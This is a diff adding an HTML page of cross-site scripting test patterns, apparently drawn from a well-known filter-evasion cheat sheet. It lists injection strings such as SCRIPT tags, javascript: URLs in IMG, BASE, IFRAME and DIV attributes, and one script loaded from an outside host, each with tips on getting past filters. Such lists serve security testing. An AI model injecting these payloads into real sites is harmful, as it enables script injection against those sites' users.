@@ -1,0 +1,2705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8"/>
+	<title>Pattern variant list</title>
+	<script type="text/javascript">
+		function toggle_visibility(tbid,lnkid)
+		{
+			if(document.all)
+			{
+				document.getElementById(tbid).style.display = document.getElementById(tbid).style.display == "block" ? "none" : "block";
+			}
+			else
+			{
+				document.getElementById(tbid).style.display = document.getElementById(tbid).style.display == "table" ? "none" : "table";
+			}
+			document.getElementById(lnkid).value = document.getElementById(lnkid).value == "[-] Collapse" ? "[+] Expand" : "[-] Collapse";
+		}
+	</script>
+	<link rel="stylesheet" href="../../stylesheet/style.css" type="text/css"/>
+	<link rel="stylesheet" href="../tables.css" type="text/css"/>
+</head>
+<body>
+<p><h2>Test pattern variants</h2></p>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant XSS Locator</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link1" type="button" value="[+] Expand" onClick="toggle_visibility('table1','link1');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table1" name="table1">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic XSS Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word "XSS" will pop up.  You'll need to replace the "&amp;" with "%26" if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you're in a rush and need to quickly check a page, often times injecting the deprecated "&lt;PLAINTEXT&gt;" tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant XSS Quick Test</td>
+	<td width="10%"><div align="right"><input id="link2" type="button" value="[+] Expand" onClick="toggle_visibility('table2','link2');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table2" name="table2">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic XSS Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">'';!--"&lt;XSS&gt;=&amp;{()}</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for &lt;XSS versus &amp;lt;XSS to see if it is vulnerable.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant SCRIPT w/Alert()</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link3" type="button" value="[+] Expand" onClick="toggle_visibility('table3','link3');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table3" name="table3">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic XSS Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic injection attack</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant SCRIPT w/Source File</td>
+	<td width="10%"><div align="right"><input id="link4" type="button" value="[+] Expand" onClick="toggle_visibility('table4','link4');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table4" name="table4">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic XSS Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant SCRIPT w/Char Code</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link5" type="button" value="[+] Expand" onClick="toggle_visibility('table5','link5');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table5" name="table5">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Basic XSS Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word "XSS" will pop up.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant BASE</td>
+	<td width="10%"><div align="right"><input id="link6" type="button" value="[+] Expand" onClick="toggle_visibility('table6','link6');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table6" name="table6">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BASE HREF="javascript:alert('XSS');//"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths.  If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant BGSOUND</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link7" type="button" value="[+] Expand" onClick="toggle_visibility('table7','link7');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table7" name="table7">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">BGSOUND</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant BODY background-image</td>
+	<td width="10%"><div align="right"><input id="link8" type="button" value="[+] Expand" onClick="toggle_visibility('table8','link8');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table8" name="table8">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BODY BACKGROUND="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">BODY image</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant BODY ONLOAD</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link9" type="button" value="[+] Expand" onClick="toggle_visibility('table9','link9');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table9" name="table9">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BODY ONLOAD=alert('XSS')&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">BODY tag (I like this method because it doesn't require using any variants of "javascript:" or "&lt;SCRIPT..." to accomplish the XSS attack)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant DIV background-image 1</td>
+	<td width="10%"><div align="right"><input id="link10" type="button" value="[+] Expand" onClick="toggle_visibility('table10','link10');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table10" name="table10">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Div background-image</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant DIV background-image 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link11" type="button" value="[+] Expand" onClick="toggle_visibility('table11','link11');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table11" name="table11">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant DIV expression</td>
+	<td width="10%"><div align="right"><input id="link12" type="button" value="[+] Expand" onClick="toggle_visibility('table12','link12');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table12" name="table12">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression"</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant FRAME</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link13" type="button" value="[+] Expand" onClick="toggle_visibility('table13','link13');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table13" name="table13">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Frame (Frames have the same sorts of XSS problems as iframes).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IFRAME</td>
+	<td width="10%"><div align="right"><input id="link14" type="button" value="[+] Expand" onClick="toggle_visibility('table14','link14');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table14" name="table14">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Iframe (If iframes are allowed there are a lot of other XSS problems as well).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant INPUT Image</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link15" type="button" value="[+] Expand" onClick="toggle_visibility('table15','link15');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table15" name="table15">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">INPUT Image</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IMG w/JavaScript Directive</td>
+	<td width="10%"><div align="right"><input id="link16" type="button" value="[+] Expand" onClick="toggle_visibility('table16','link16');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table16" name="table16">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Image XSS using the JavaScript directive.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant IMG No Quotes/Semicolon</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link17" type="button" value="[+] Expand" onClick="toggle_visibility('table17','link17');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table17" name="table17">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=javascript:alert('XSS')&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">No quotes and no semicolon</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IMG Dynsrc</td>
+	<td width="10%"><div align="right"><input id="link18" type="button" value="[+] Expand" onClick="toggle_visibility('table18','link18');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table18" name="table18">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG DYNSRC="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">IMG Dynsrc</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant IMG Lowsrc</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link19" type="button" value="[+] Expand" onClick="toggle_visibility('table19','link19');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table19" name="table19">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
